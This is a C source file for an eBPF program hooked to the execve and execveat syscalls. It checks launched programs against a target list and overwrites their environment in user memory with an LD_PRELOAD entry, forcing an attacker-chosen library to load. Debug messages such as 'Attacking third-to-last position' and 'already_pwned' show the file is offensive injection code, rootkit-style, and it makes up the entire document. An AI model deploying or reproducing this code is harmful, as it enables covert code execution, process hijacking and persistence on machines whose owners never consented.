#include "vmlinux.h"
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_tracing.h>
#include <bpf/bpf_core_read.h>
#include <errno.h>

char __license[] SEC("license") = "GPL";

#ifndef offsetof
#define offsetof(TYPE, MEMBER) ((size_t) & ((TYPE *)0)->MEMBER)
#endif

struct events {
    u32 test;
    char * comm[70];
    char * camm[70];
};

struct exec_evt {
    pid_t pid;
    pid_t tgid;
    char comm[32];
    char file[32];
    int success;
};


struct execve_args {
    short common_type;
    char common_flags;
    char common_preempt_count;
    int common_pid;
    int __syscall_nr;
    char *filename;
    const char *const *argv;
    const char *const *envp;
};


struct execveat_args {
    short common_type;
    char common_flags;
    char common_preempt_count;
    int common_pid;
    int __syscall_nr;
    int dirfd;
    char *filename;
    const char *const *argv;
    const char *const *envp;
    int flags;
};

struct events *unused __attribute__((unused));
struct exec_evt *unusedexec __attribute__((unused));

struct {
    __uint(type, BPF_MAP_TYPE_ARRAY);
    __uint(max_entries, 1);
    __type(key, pid_t);
    __type(value, struct events);
} hotdirs SEC(".maps");

struct {
    __uint(type, BPF_MAP_TYPE_ARRAY);
    __uint(max_entries, 1);
    __type(key, pid_t);
    __type(value, char[60]);
} start SEC(".maps");

struct {
    __uint(type, BPF_MAP_TYPE_ARRAY);
    __uint(max_entries, 5);
    __type(key, pid_t);
    __type(value, char[25]);
} progs SEC(".maps");

struct {
    __uint(type, BPF_MAP_TYPE_ARRAY);
    __uint(max_entries, 5);
    __type(key, pid_t);
    __type(value, int);
} action SEC(".maps");

struct {
    __uint(type, BPF_MAP_TYPE_RINGBUF);
    __uint(max_entries, 256 * 1024);
} rb SEC(".maps");


struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 1024);
    __type(key, pid_t);
    __type(value, u8);
} injected_pids SEC(".maps");


struct {
    __uint(type, BPF_MAP_TYPE_ARRAY);
    __uint(max_entries, 8);
    __type(key, u32);
    __type(value, u64);
} stats SEC(".maps");

const char ldstr[] = "LD_PRELOAD=";

static __always_inline int local_strncmp(const char *s1, const char *s2, unsigned int sz) {
    int ret = 0;
    unsigned int i;
    
    #pragma unroll
    for (i = 0; i < sz; i++) {
        ret = (unsigned char)s1[i] - (unsigned char)s2[i];
        if (ret || !s1[i]) {
            break;
        }
    }
    
    return (ret);
}

static __always_inline int test_prog(const char *s1) {
    int l = 0;
    char *value;
    
    value = bpf_map_lookup_elem(&progs, &l);
    
    if (value && value != NULL) {
        bpf_printk("[DEBUG] Comparing: %s and %s", s1, value);
        
        if (local_strncmp(s1, value, 10) == 0) {
            bpf_printk("[DEBUG] Match found");
            return 1;
        }
    }
    
    l = 1;
    value = bpf_map_lookup_elem(&progs, &l);
    
    if (value && value != NULL) {
        if (local_strncmp(s1, value, 10) == 0) {
            return 1;
        }
    }
    
    l = 2;
    value = bpf_map_lookup_elem(&progs, &l);
    
    if (value && value != NULL) {
        if (local_strncmp(s1, value, 10) == 0) {
            return 1;
        }
    }
    
    return 0;
}


static inline void increment_stat(u32 stat_key) {
    u64 *count = bpf_map_lookup_elem(&stats, &stat_key);
    if (count) 
        (*count)++;
}


static __always_inline int try_aggressive_write(void *target_ptr, char *valueX, int size) {
    
    long write_res = bpf_probe_write_user(target_ptr, valueX, size);
    if (write_res == 0) {
        return 1;  
    }
    
    
    write_res = bpf_probe_write_user(target_ptr, valueX, size);
    if (write_res == 0) {
        return 1;
    }
    
    
    write_res = bpf_probe_write_user(target_ptr, valueX, size);
    if (write_res == 0) {
        return 1;
    }
    
    
    write_res = bpf_probe_write_user(target_ptr, valueX, size);
    if (write_res == 0) {
        return 1;
    }
    
    
    write_res = bpf_probe_write_user(target_ptr, valueX, size);
    if (write_res == 0) {
        return 1;
    }
    
    return 0;  
}


static __always_inline int process_execution(void *filename_ptr, const char *const *envp) {
    pid_t zero = 0;
    int *actions;
    int success = 0;
    
    actions = bpf_map_lookup_elem(&action, &zero);
    
    
    if (!actions || *actions != 1) {
        return 0;
    }
    
    
    increment_stat(0);
    
    char comm[30];
    bpf_probe_read_str(&comm, sizeof(comm), filename_ptr);
    
    bpf_printk("[TP] Verifying program: %s", comm);
    
    int toinject = test_prog(comm);
    if (toinject == 0) {
        bpf_printk("[TP] Program is not a target");
        return 0;
    }
    
    bpf_printk("[TP] Target program detected: %s", comm);
    
    
    pid_t pid = bpf_get_current_pid_tgid() >> 32;
    u8 *injected = bpf_map_lookup_elem(&injected_pids, &pid);
    if (injected && *injected) {
        bpf_printk("[TP] Already attempted injection in PID %d", pid);
        return 0;
    }
    
    
    u8 val = 1;
    bpf_map_update_elem(&injected_pids, &pid, &val, BPF_ANY);
    
    struct events *event = bpf_map_lookup_elem(&hotdirs, &zero);
    if (!event) {
        bpf_printk("[TP] Error: Event not found in hotdirs map");
        return 0;
    }
    
    
    if (!envp) {
        bpf_printk("[TP] Error: envp is NULL");
        return 0;
    }
    
    
    long read_res = bpf_probe_read_user(&event->comm, sizeof(event->comm), envp);
    if (read_res != 0) {
        bpf_printk("[TP] Error reading envp: %ld", read_res);
        increment_stat(2); 
        return 0;
    }
    
    bpf_printk("[TP] Environment variables read correctly");
    
    
    pid_t key = 0;
    char *value = bpf_map_lookup_elem(&start, &key);
    if (!value) {
        bpf_printk("[TP] Error: Value to inject not found");
        increment_stat(2); 
        return 0;
    }
    
    char valueX[60];
    read_res = bpf_probe_read_str(&valueX, sizeof(valueX), value);
    if (read_res <= 0) {
        bpf_printk("[TP] Error reading value to inject: %ld", read_res);
        increment_stat(2); 
        return 0;
    }
    
    bpf_printk("[TP] Value to inject: %s", valueX);
    
    
    bool already_pwned = false;
    int var_count = 0;
    
    
    #pragma unroll
    for (int i = 0; i < 70; i++) {
        void *env_ptr;
        read_res = bpf_probe_read(&env_ptr, sizeof(env_ptr), &event->comm[i]);
        if (read_res != 0) {
            bpf_printk("[TP] Error reading env pointer[%d]: %ld", i, read_res);
            break;
        }
        
        
        if (env_ptr == NULL) {
            bpf_printk("[TP] Found end of array at env[%d]", i);
            break;
        }
        
        var_count++;
        
        
        char env_var[15];
        read_res = bpf_probe_read_str(env_var, sizeof(env_var), env_ptr);
        if (read_res <= 0) {
            continue;
        }
        
        if (local_strncmp(env_var, ldstr, 10) == 0) {
            bpf_printk("[TP] Already has LD_PRELOAD at env[%d], skipping", i);
            already_pwned = true;
            increment_stat(3); 
            break;
        }
    }
    
    if (already_pwned) {
        return 0;
    }
    
    bpf_printk("[TP] Total variables found: %d", var_count);
    
    
    
    
    void *env_ptr;
    int target_idx;
    
    if (var_count > 3) {
        target_idx = var_count - 3;  
        bpf_printk("[TP] STEP 1: Attacking third-to-last position %d", target_idx);
        
        read_res = bpf_probe_read(&env_ptr, sizeof(env_ptr), &event->comm[target_idx]);
        if (read_res == 0 && env_ptr != NULL) {
            if (try_aggressive_write(env_ptr, valueX, sizeof(valueX))) {
                bpf_printk("[TP] ✓ Injection successful at third-to-last position %d", target_idx);
                success = 1;
                goto registro;
            } else {
                bpf_printk("[TP] x Injection failed at third-to-last position %d", target_idx);
            }
        }
    }
    
    
    if (var_count > 37) {
        bpf_printk("[TP] STEP 2: Attacking magic position 37");
        
        read_res = bpf_probe_read(&env_ptr, sizeof(env_ptr), &event->comm[37]);
        if (read_res == 0 && env_ptr != NULL) {
            if (try_aggressive_write(env_ptr, valueX, sizeof(valueX))) {
                bpf_printk("[TP] ✓ Injection successful at magic position 37");
                success = 1;
                goto registro;
            } else {
                bpf_printk("[TP] x Injection failed at magic position 37");
            }
        }
    }
    
    
    bpf_printk("[TP] STEP 3: Iterating through all variables");
    
    int i;
    for (i = 0; i < 70; i++) {
        if (i == 37 || (var_count > 3 && i == var_count - 3)) {
            
            continue;
        }
        
        read_res = bpf_probe_read(&env_ptr, sizeof(env_ptr), &event->comm[i]);
        if (read_res != 0 || env_ptr == NULL) {
            
            if (i >= var_count) {
                break;
            }
            continue;
        }
        
        bpf_printk("[TP] Attempting at env[%d]", i);
        if (try_aggressive_write(env_ptr, valueX, sizeof(valueX))) {
            bpf_printk("[TP] ✓ Injection successful at env[%d]", i);
            success = 1;
            break;
        }
    }
    
registro:
    
    if (success) {
        increment_stat(1); 
        bpf_printk("[TP] ✓ FINAL SUCCESS: LD_PRELOAD injected correctly");
    } else {
        bpf_printk("[TP] x FINAL FAILURE: Could not inject in any variable");
        increment_stat(2); 
    }
    
    
    struct task_struct *task = (struct task_struct*)bpf_get_current_task();
    struct exec_evt *evt = {0};
    
    evt = bpf_ringbuf_reserve(&rb, sizeof(*evt), 0);
    if (!evt) {
        bpf_printk("[TP] Could not reserve ringbuffer");
        return success;
    }

    evt->tgid = BPF_CORE_READ(task, tgid);
    evt->pid = BPF_CORE_READ(task, pid);
    bpf_probe_read_str(&evt->file, sizeof(evt->file), filename_ptr);
    evt->success = success;
    bpf_ringbuf_submit(evt, 0);
    
    bpf_printk("[TP] END OF PROCESSING, success=%d", success);
    
    return success;
}


SEC("tracepoint/syscalls/sys_enter_execve")
int bpf_execve_prog(struct execve_args *ctx) {
    return process_execution(ctx->filename, ctx->envp);
}


SEC("tracepoint/syscalls/sys_enter_execveat")
int bpf_execveat_prog(struct execveat_args *ctx) {
    bpf_printk("[EXECVEAT] Detected call to execveat");
    return process_execution(ctx->filename, ctx->envp);
}
